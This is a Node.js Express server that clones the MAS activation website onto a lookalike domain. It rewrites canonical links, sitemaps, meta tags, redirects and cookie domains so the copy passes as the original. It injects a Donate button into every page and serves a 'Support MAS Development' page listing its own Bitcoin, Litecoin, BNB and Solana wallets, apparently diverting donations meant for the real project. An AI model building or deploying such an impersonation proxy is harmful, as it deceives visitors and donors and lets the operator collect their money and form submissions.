const express = require("express");
const { createProxyMiddleware, responseInterceptor } = require("http-proxy-middleware");
const compression = require("compression");
const zlib = require("zlib");

// ─── Configuration ───────────────────────────────────────────────────────────
const ORIGIN_HOST = process.env.ORIGIN_HOST || "massgrave.dev";
const MIRROR_HOST = process.env.MIRROR_HOST || "massgrave.run";
const PORT = parseInt(process.env.PORT, 10) || 3000;
const ORIGIN_URL = `https://${ORIGIN_HOST}`;

// ─── App setup ───────────────────────────────────────────────────────────────
const app = express();

// Trust proxy (Railway / Render / nginx)
app.set("trust proxy", true);

// Gzip compression for responses we generate (error pages, robots, etc.)
app.use(compression());

// Security headers — but allow framing from same origin
app.use((_req, res, next) => {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
  next();
});

// ─── Helper: rewrite all origin references to mirror domain ──────────────────
function rewriteBody(body, contentType) {
  if (!body || typeof body !== "string") return body;

  const isHTML = /text\/html/i.test(contentType);
  const isCSS = /text\/css/i.test(contentType);
  const isJS = /javascript|json/i.test(contentType);
  const isXML = /xml|sitemap/i.test(contentType);
  const isText = isHTML || isCSS || isJS || isXML || /text\/plain/i.test(contentType);

  if (!isText) return body;

  let result = body;

  // 1. Replace all full URLs:  https://massgrave.dev → https://massgrave.run
  result = result.replace(
    new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
    `https://${MIRROR_HOST}`
  );

  // 2. Replace protocol-relative URLs:  //massgrave.dev → //massgrave.run
  result = result.replace(
    new RegExp(`//${escapeRegExp(ORIGIN_HOST)}`, "gi"),
    `//${MIRROR_HOST}`
  );

  // 3. HTML-specific rewrites
  if (isHTML) {
    // Rewrite canonical link to mirror domain
    result = result.replace(
      /(<link\s[^>]*rel\s*=\s*["']canonical["'][^>]*href\s*=\s*["'])([^"']*)(["'][^>]*>)/gi,
      (_match, before, href, after) => {
        const newHref = href.replace(
          new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
          `https://${MIRROR_HOST}`
        );
        return before + newHref + after;
      }
    );

    // Also handle canonical where href comes before rel
    result = result.replace(
      /(<link\s[^>]*href\s*=\s*["'])([^"']*)(["'][^>]*rel\s*=\s*["']canonical["'][^>]*>)/gi,
      (_match, before, href, after) => {
        const newHref = href.replace(
          new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
          `https://${MIRROR_HOST}`
        );
        return before + newHref + after;
      }
    );

    // Rewrite Open Graph url meta tags
    result = result.replace(
      /(<meta\s[^>]*property\s*=\s*["']og:url["'][^>]*content\s*=\s*["'])([^"']*)(["'][^>]*>)/gi,
      (_match, before, content, after) => {
        const newContent = content.replace(
          new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
          `https://${MIRROR_HOST}`
        );
        return before + newContent + after;
      }
    );

    // Rewrite og:url where content comes before property
    result = result.replace(
      /(<meta\s[^>]*content\s*=\s*["'])([^"']*)(["'][^>]*property\s*=\s*["']og:url["'][^>]*>)/gi,
      (_match, before, content, after) => {
        const newContent = content.replace(
          new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
          `https://${MIRROR_HOST}`
        );
        return before + newContent + after;
      }
    );

    // Rewrite twitter:url meta tags
    result = result.replace(
      /(<meta\s[^>]*(?:name|property)\s*=\s*["']twitter:url["'][^>]*content\s*=\s*["'])([^"']*)(["'][^>]*>)/gi,
      (_match, before, content, after) => {
        const newContent = content.replace(
          new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
          `https://${MIRROR_HOST}`
        );
        return before + newContent + after;
      }
    );

    // Rewrite alternate/hreflang links
    result = result.replace(
      /(<link\s[^>]*rel\s*=\s*["']alternate["'][^>]*href\s*=\s*["'])([^"']*)(["'][^>]*>)/gi,
      (_match, before, href, after) => {
        const newHref = href.replace(
          new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
          `https://${MIRROR_HOST}`
        );
        return before + newHref + after;
      }
    );

    // Ensure no stray origin references remain in any href/src/action attributes
    result = result.replace(
      new RegExp(`((?:href|src|action|srcset|data-url|data-href)\\s*=\\s*["'])https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
      `$1https://${MIRROR_HOST}`
    );

    // Rewrite JSON-LD structured data
    result = result.replace(
      /(<script\s[^>]*type\s*=\s*["']application\/ld\+json["'][^>]*>)([\s\S]*?)(<\/script>)/gi,
      (_match, openTag, jsonContent, closeTag) => {
        const rewritten = jsonContent.replace(
          new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
          `https://${MIRROR_HOST}`
        );
        return openTag + rewritten + closeTag;
      }
    );
  }

  // 4. Sitemap-specific rewrites (XML sitemaps)
  if (isXML) {
    // Ensure <loc> tags point to mirror
    result = result.replace(
      /(<loc>)([\s\S]*?)(<\/loc>)/gi,
      (_match, open, url, close) => {
        const newUrl = url
          .trim()
          .replace(
            new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
            `https://${MIRROR_HOST}`
          );
        return open + newUrl + close;
      }
    );

    // Rewrite <xhtml:link> href in sitemaps
    result = result.replace(
      /(href\s*=\s*["'])([^"']*)(["'])/gi,
      (_match, before, href, after) => {
        const newHref = href.replace(
          new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
          `https://${MIRROR_HOST}`
        );
        return before + newHref + after;
      }
    );
  }

  return result;
}

function escapeRegExp(string) {
  return string.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

// ─── Donate navbar button injection ──────────────────────────────────────────
// Strategy: inject CSS to create space in navbar + fixed element outside React root
const DONATE_INJECT_HTML = `
<style>
/* Reserve space in navbar for donate button on all screen sizes */
.navbar .navbar__inner{
  padding-right:90px!important;
}
#mas-donate-btn{
  position:fixed;
  top:0;
  right:0;
  height:60px;
  z-index:10000;
  display:flex;
  align-items:center;
  padding:0 16px 0 8px;
}
#mas-donate-btn a{
  color:#e8590c;
  font-weight:700;
  font-size:.9rem;
  text-decoration:none;
  padding:6px 14px;
  border-radius:6px;
  font-family:system-ui,-apple-system,"Segoe UI",Roboto,Ubuntu,Cantarell,"Noto Sans",sans-serif;
  transition:all .2s;
  white-space:nowrap;
}
#mas-donate-btn a:hover{
  color:#fff;
  background:#e8590c;
}
/* Also add Donate link inside mobile sidebar menu */
.mas-donate-sidebar{
  display:none;
}
@media(max-width:996px){
  .navbar .navbar__inner{
    padding-right:80px!important;
  }
  #mas-donate-btn{
    padding:0 10px 0 4px;
  }
  #mas-donate-btn a{
    font-size:.8rem;
    padding:5px 10px;
  }
  .mas-donate-sidebar{
    display:list-item;
  }
}
/* Hide donate button when on /donate page */
body.is-donate-page #mas-donate-btn{
  display:none!important;
}
body.is-donate-page .navbar .navbar__inner{
  padding-right:0!important;
}
body.is-donate-page .mas-donate-sidebar{
  display:none!important;
}
</style>
<div id="mas-donate-btn"><a href="/donate">Donate</a></div>
<script>
(function(){
  // Hide donate button on /donate page
  function checkDonatePage(){
    if(location.pathname==='/donate'||location.pathname==='/donate/'){
      document.body.classList.add('is-donate-page');
    }else{
      document.body.classList.remove('is-donate-page');
    }
  }
  checkDonatePage();

  // Add donate link to mobile sidebar
  function addSidebarLink(){
    if(document.body.classList.contains('is-donate-page'))return;
    var lists=document.querySelectorAll('.navbar-sidebar__item.menu .menu__list');
    lists.forEach(function(ul){
      if(ul.querySelector('.mas-donate-sidebar'))return;
      var li=document.createElement('li');
      li.className='menu__list-item mas-donate-sidebar';
      li.innerHTML='<a class="menu__link" href="/donate" style="color:#e8590c;font-weight:700;">Donate</a>';
      ul.appendChild(li);
    });
  }
  addSidebarLink();
  new MutationObserver(function(){checkDonatePage();addSidebarLink();}).observe(document.body,{childList:true,subtree:true});
})();
</script>`;

function injectDonateButton(html) {
  // Inject right before </body> — outside React's root
  const idx = html.lastIndexOf('</body>');
  if (idx !== -1) {
    return html.slice(0, idx) + DONATE_INJECT_HTML + html.slice(idx);
  }
  return html + DONATE_INJECT_HTML;
}

// ─── Custom /donate page ─────────────────────────────────────────────────────
function getDonatePage() {
  return `<!DOCTYPE html>
<html lang="en" dir="ltr" data-theme="dark" data-has-hydrated="false">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Donate - MAS</title>
  <meta name="description" content="Support MAS development with cryptocurrency donations">
  <link rel="canonical" href="https://${MIRROR_HOST}/donate">
  <meta property="og:title" content="Donate - MAS">
  <meta property="og:url" content="https://${MIRROR_HOST}/donate">
  <link rel="icon" href="/img/favicon.ico">
  <style>
    :root {
      --ifm-color-primary: #2e8555;
      --ifm-color-primary-dark: #29784c;
      --ifm-color-primary-darker: #277148;
      --ifm-color-primary-darkest: #205d3b;
      --ifm-color-primary-light: #33925d;
      --ifm-color-primary-lighter: #359962;
      --ifm-color-primary-lightest: #3cad6e;
      --ifm-background-color: #1b1b1d;
      --ifm-background-surface-color: #242526;
      --ifm-font-color-base: #e3e3e3;
      --ifm-heading-color: #ffffff;
      --ifm-container-width: 1140px;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Ubuntu, Cantarell, "Noto Sans", sans-serif;
      background-color: var(--ifm-background-color);
      color: var(--ifm-font-color-base);
      line-height: 1.65;
    }
    .navbar {
      background-color: #242526;
      height: 60px;
      display: flex;
      align-items: center;
      padding: 0 1rem;
      box-shadow: 0 1px 2px 0 rgba(0,0,0,.3);
      position: sticky;
      top: 0;
      z-index: 999;
    }
    .navbar__inner {
      display: flex;
      align-items: center;
      justify-content: space-between;
      width: 100%;
      max-width: var(--ifm-container-width);
      margin: 0 auto;
    }
    .navbar__brand {
      display: flex;
      align-items: center;
      text-decoration: none;
      color: var(--ifm-heading-color);
      font-weight: bold;
      font-size: 1.1rem;
      gap: 0.5rem;
    }
    .navbar__brand img { height: 32px; }
    .navbar__items { display: flex; align-items: center; gap: 1rem; }
    .navbar__link {
      color: var(--ifm-font-color-base);
      text-decoration: none;
      font-size: 0.9rem;
      font-weight: 500;
    }
    .navbar__link:hover { color: var(--ifm-color-primary); }
    .navbar__link--donate { color: #e8590c !important; font-weight: bold !important; }
    .container {
      max-width: var(--ifm-container-width);
      margin: 0 auto;
      padding: 2rem 1rem 3rem;
    }
    h1 {
      font-size: 2rem;
      color: var(--ifm-heading-color);
      margin-bottom: 0.5rem;
    }
    .subtitle {
      font-size: 1.1rem;
      color: #a0a0a0;
      margin-bottom: 2rem;
    }
    hr {
      border: none;
      border-top: 1px solid #3a3a3c;
      margin: 1.5rem 0;
    }
    .donate-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
      gap: 1.5rem;
      margin-top: 1.5rem;
    }
    .donate-card {
      background: var(--ifm-background-surface-color);
      border: 1px solid #3a3a3c;
      border-radius: 8px;
      padding: 1.5rem;
      transition: border-color 0.2s;
    }
    .donate-card:hover {
      border-color: var(--ifm-color-primary);
    }
    .donate-card h3 {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      color: var(--ifm-heading-color);
      margin-bottom: 1rem;
      font-size: 1.15rem;
    }
    .donate-card .coin-icon {
      width: 28px;
      height: 28px;
      border-radius: 50%;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      font-size: 0.85rem;
      font-weight: bold;
      color: #fff;
      flex-shrink: 0;
    }
    .coin-btc { background: #f7931a; }
    .coin-ltc { background: #345d9d; }
    .coin-bnb { background: #f3ba2f; color: #000 !important; }
    .coin-sol { background: linear-gradient(135deg, #9945ff, #14f195); }
    .address-box {
      background: #1b1b1d;
      border: 1px solid #3a3a3c;
      border-radius: 6px;
      padding: 0.75rem 1rem;
      display: flex;
      align-items: center;
      gap: 0.75rem;
    }
    .address-text {
      font-family: "SFMono-Regular", Menlo, Consolas, "Liberation Mono", monospace;
      font-size: 0.78rem;
      word-break: break-all;
      flex: 1;
      color: #c9d1d9;
      user-select: all;
    }
    .copy-btn {
      background: transparent;
      border: 1px solid #3a3a3c;
      border-radius: 4px;
      color: var(--ifm-font-color-base);
      cursor: pointer;
      padding: 6px 10px;
      font-size: 0.8rem;
      transition: all 0.2s;
      white-space: nowrap;
      flex-shrink: 0;
    }
    .copy-btn:hover {
      background: var(--ifm-color-primary);
      border-color: var(--ifm-color-primary);
      color: #fff;
    }
    .copy-btn.copied {
      background: var(--ifm-color-primary);
      border-color: var(--ifm-color-primary);
      color: #fff;
    }
    .tip-box {
      background: rgba(46,133,85,0.1);
      border: 1px solid rgba(46,133,85,0.3);
      border-radius: 8px;
      padding: 1rem 1.25rem;
      margin-top: 2rem;
    }
    .tip-box strong { color: var(--ifm-color-primary); }
    .breadcrumbs {
      list-style: none;
      display: flex;
      gap: 0.5rem;
      margin-bottom: 1.5rem;
      font-size: 0.9rem;
    }
    .breadcrumbs a {
      color: var(--ifm-color-primary);
      text-decoration: none;
    }
    .breadcrumbs a:hover { text-decoration: underline; }
    .breadcrumbs .sep { color: #666; }
    .breadcrumbs .current { color: var(--ifm-font-color-base); }
    @media (max-width: 768px) {
      .donate-grid { grid-template-columns: 1fr; }
      .navbar__items--hide-mobile { display: none; }
    }
  </style>
</head>
<body>
  <nav class="navbar">
    <div class="navbar__inner">
      <div class="navbar__items">
        <a class="navbar__brand" href="/">
          <img src="/img/logo.png" alt="MAS">
          <b>MAS</b>
        </a>
        <a class="navbar__link navbar__items--hide-mobile" href="/">Home</a>
        <a class="navbar__link navbar__items--hide-mobile" href="/genuine-installation-media">Download Windows / Office</a>
        <a class="navbar__link navbar__items--hide-mobile" href="/faq">FAQ</a>
        <a class="navbar__link navbar__items--hide-mobile" href="/troubleshoot">Troubleshoot</a>
      </div>
      <div class="navbar__items">
        <a class="navbar__link navbar__items--hide-mobile" href="/blog">Blog</a>
        <a class="navbar__link navbar__items--hide-mobile" href="/contactus">Contact Us</a>
      </div>
    </div>
  </nav>

  <div class="container">
    <ul class="breadcrumbs">
      <li><a href="/">Home</a></li>
      <li class="sep">/</li>
      <li class="current">Donate</li>
    </ul>

    <header>
      <h1>Support MAS Development</h1>
      <p class="subtitle">Your donation helps keep this project alive and maintained. Every contribution is appreciated!</p>
    </header>

    <hr>

    <div class="donate-grid">
      <div class="donate-card">
        <h3><span class="coin-icon coin-btc">&#8383;</span> Bitcoin (BTC)</h3>
        <div class="address-box">
          <span class="address-text">bc1ql6mxrpw6hgcjlt9ny4f9m9qj5c9n8q6fqp0r8qdvyxeyd6arvq7qt0yzdh</span>
          <button class="copy-btn" onclick="copyAddr(this)">Copy</button>
        </div>
      </div>

      <div class="donate-card">
        <h3><span class="coin-icon coin-ltc">&#321;</span> Litecoin (LTC)</h3>
        <div class="address-box">
          <span class="address-text">ltc1q9ql9dvznmlka3k0mjatlt7kppj8qu4gu8z9ef9qcrhdewhja7xnsw5059g</span>
          <button class="copy-btn" onclick="copyAddr(this)">Copy</button>
        </div>
      </div>

      <div class="donate-card">
        <h3><span class="coin-icon coin-bnb">B</span> BNB Smart Chain (BSC)</h3>
        <div class="address-box">
          <span class="address-text">0x5dea511ce409452a38e283462e0c8afd2e8d720b</span>
          <button class="copy-btn" onclick="copyAddr(this)">Copy</button>
        </div>
      </div>

      <div class="donate-card">
        <h3><span class="coin-icon coin-sol">S</span> Solana (SOL)</h3>
        <div class="address-box">
          <span class="address-text">6y31Eqx74xVumCiunL25Ff1ms3iA9eFUffrVHu5SYE2R</span>
          <button class="copy-btn" onclick="copyAddr(this)">Copy</button>
        </div>
      </div>
    </div>

    <div class="tip-box">
      <p><strong>Tip:</strong> Always double-check the wallet address before sending. Click the <strong>Copy</strong> button to copy the exact address to your clipboard.</p>
    </div>
  </div>

  <script>
    function copyAddr(btn) {
      var text = btn.parentElement.querySelector('.address-text').textContent;
      navigator.clipboard.writeText(text).then(function() {
        btn.textContent = 'Copied!';
        btn.classList.add('copied');
        setTimeout(function() {
          btn.textContent = 'Copy';
          btn.classList.remove('copied');
        }, 2000);
      });
    }
  </script>
</body>
</html>`;
}

// ─── Serve /donate page ──────────────────────────────────────────────────────
app.get("/donate", (_req, res) => {
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.setHeader("Cache-Control", "public, max-age=3600");
  res.send(getDonatePage());
});

// ─── Custom robots.txt — point sitemap to mirror domain ──────────────────────
app.get("/robots.txt", async (_req, res) => {
  try {
    const upstream = await fetch(`${ORIGIN_URL}/robots.txt`, {
      headers: { "User-Agent": "MirrorBot/1.0" },
    });
    let body = await upstream.text();

    // Rewrite sitemap references
    body = body.replace(
      new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
      `https://${MIRROR_HOST}`
    );

    // If no sitemap line exists, add one
    if (!/sitemap:/i.test(body)) {
      body += `\nSitemap: https://${MIRROR_HOST}/sitemap.xml\n`;
    }

    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.setHeader("Cache-Control", "public, max-age=3600");
    res.send(body);
  } catch (err) {
    console.error("robots.txt fetch error:", err.message);
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.send(
      `User-agent: *\nAllow: /\n\nSitemap: https://${MIRROR_HOST}/sitemap.xml\n`
    );
  }
});

// ─── decompress helper (fault-tolerant) ──────────────────────────────────────
function tryDecompress(buffer, fn) {
  return new Promise((resolve) => {
    fn(buffer, (err, result) => resolve(err ? null : result));
  });
}

async function decompressBuffer(buffer, encoding) {
  if (!encoding || !buffer || buffer.length === 0) return buffer;

  // Try declared encoding first
  const decoders = {
    gzip: zlib.gunzip,
    deflate: zlib.inflate,
    br: zlib.brotliDecompress,
  };

  const primary = decoders[encoding];
  if (primary) {
    const result = await tryDecompress(buffer, primary);
    if (result) return result;
  }

  // If declared encoding failed, try all others
  for (const [name, fn] of Object.entries(decoders)) {
    if (name === encoding) continue;
    const result = await tryDecompress(buffer, fn);
    if (result) return result;
  }

  // Also try inflate raw (some servers send raw deflate without zlib header)
  const rawResult = await tryDecompress(buffer, zlib.inflateRaw);
  if (rawResult) return rawResult;

  // Nothing worked — return buffer as-is (probably already uncompressed)
  return buffer;
}

// ─── Main reverse-proxy with response rewriting ──────────────────────────────
app.use("*", async (req, res) => {
  const path = req.originalUrl;
  const targetUrl = `${ORIGIN_URL}${path}`;

  try {
    // Build headers, preserving most originals
    const headers = {};
    for (const [key, value] of Object.entries(req.headers)) {
      // Skip hop-by-hop and host headers
      if (
        ["host", "connection", "keep-alive", "transfer-encoding", "upgrade"].includes(
          key.toLowerCase()
        )
      )
        continue;
      headers[key] = value;
    }
    headers["host"] = ORIGIN_HOST;
    headers["x-forwarded-host"] = MIRROR_HOST;

    // Remove accept-encoding so we get uncompressed response from origin
    // (easier to rewrite; we compress outgoing ourselves)
    delete headers["accept-encoding"];

    // Build fetch options
    const fetchOpts = {
      method: req.method,
      headers,
      redirect: "manual", // Handle redirects ourselves to rewrite Location
    };

    // Forward body for POST/PUT/PATCH
    if (["POST", "PUT", "PATCH"].includes(req.method)) {
      const chunks = [];
      for await (const chunk of req) {
        chunks.push(chunk);
      }
      fetchOpts.body = Buffer.concat(chunks);
    }

    const upstream = await fetch(targetUrl, fetchOpts);

    // ── Copy upstream status ──
    res.status(upstream.status);

    // ── Copy upstream headers, with rewrites ──
    const skipHeaders = new Set([
      "content-encoding",
      "content-length",
      "transfer-encoding",
      "connection",
      "keep-alive",
      "alt-svc",
      "strict-transport-security",
    ]);

    for (const [key, value] of upstream.headers.entries()) {
      if (skipHeaders.has(key.toLowerCase())) continue;

      let headerValue = value;

      // Rewrite Location header on redirects
      if (key.toLowerCase() === "location") {
        headerValue = headerValue.replace(
          new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
          `https://${MIRROR_HOST}`
        );
      }

      // Rewrite Set-Cookie domain
      if (key.toLowerCase() === "set-cookie") {
        headerValue = headerValue.replace(
          new RegExp(`domain\\s*=\\s*\\.?${escapeRegExp(ORIGIN_HOST)}`, "gi"),
          `domain=${MIRROR_HOST}`
        );
      }

      // Rewrite Link header
      if (key.toLowerCase() === "link") {
        headerValue = headerValue.replace(
          new RegExp(`https?://${escapeRegExp(ORIGIN_HOST)}`, "gi"),
          `https://${MIRROR_HOST}`
        );
      }

      try {
        res.setHeader(key, headerValue);
      } catch {
        // skip invalid headers
      }
    }

    // ── Handle body ──
    const contentType = upstream.headers.get("content-type") || "";
    const contentEncoding = upstream.headers.get("content-encoding") || "";
    const isTextContent =
      /text\/|javascript|json|xml|svg|sitemap|atom|rss/i.test(contentType);

    if (isTextContent) {
      // Read full body, decompress if needed, rewrite, send
      const rawBuffer = Buffer.from(await upstream.arrayBuffer());
      const decompressed = await decompressBuffer(rawBuffer, contentEncoding);
      const bodyStr = decompressed.toString("utf-8");
      const rewritten = rewriteBody(bodyStr, contentType);

      // Inject donate button into navbar for HTML pages
      let finalBody = rewritten;
      if (/text\/html/i.test(contentType)) {
        finalBody = injectDonateButton(finalBody);
      }

      // Set correct content-length for rewritten body
      const outBuffer = Buffer.from(finalBody, "utf-8");
      res.setHeader("Content-Length", outBuffer.length);
      res.end(outBuffer);
    } else {
      // Binary content — stream through directly
      const rawBuffer = Buffer.from(await upstream.arrayBuffer());

      if (contentEncoding) {
        // Decompress to avoid mismatched content-encoding
        const decompressed = await decompressBuffer(rawBuffer, contentEncoding);
        res.setHeader("Content-Length", decompressed.length);
        res.end(decompressed);
      } else {
        res.setHeader("Content-Length", rawBuffer.length);
        res.end(rawBuffer);
      }
    }
  } catch (err) {
    console.error(`Proxy error for ${path}:`, err.message);
    if (!res.headersSent) {
      res.status(502).send("Bad Gateway");
    }
  }
});

// ─── Start ───────────────────────────────────────────────────────────────────
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Mirror proxy running on port ${PORT}`);
  console.log(`  Origin:  https://${ORIGIN_HOST}`);
  console.log(`  Mirror:  https://${MIRROR_HOST}`);
});
